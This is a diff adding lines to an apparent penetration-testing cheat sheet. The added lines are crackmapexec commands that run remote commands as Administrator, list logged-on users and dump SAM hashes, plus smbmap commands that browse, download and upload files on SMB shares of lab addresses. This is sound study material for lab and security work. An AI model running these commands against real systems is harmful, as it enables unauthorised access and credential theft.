@@ -1635,6 +1635,9 @@ crackmapexec smb 192.168.x.x -u 'guest' -p '' --shares
 
 crackmapexec smb 192.168.x.x -u 'username' -p 'password' --shares
 crackmapexec smb 192.168.x.x -u username.txt -p 'password' --continue-on-success
+crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
+crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
+crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
 
 #ssh
 crackmapexec ssh 192.168.x.x -u 'username' -p 'password' --continue-on-success
@@ -1663,6 +1666,12 @@ enum4linux -a 192.168.201.175
 smbmap -H 192.168.x.x
 smbmap -H 192.168.x.x -u '' -p ''
 smbmap -u username -p password -d active.htb -H 192.168.193.5
+
+# using -r, we can see what's on the directory
+smbmap -H 10.129.14.128 -r notes
+
+smbmap -H 10.129.14.128 --download "notes\note.txt"
+smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
 ```
 
 ### rpcclient
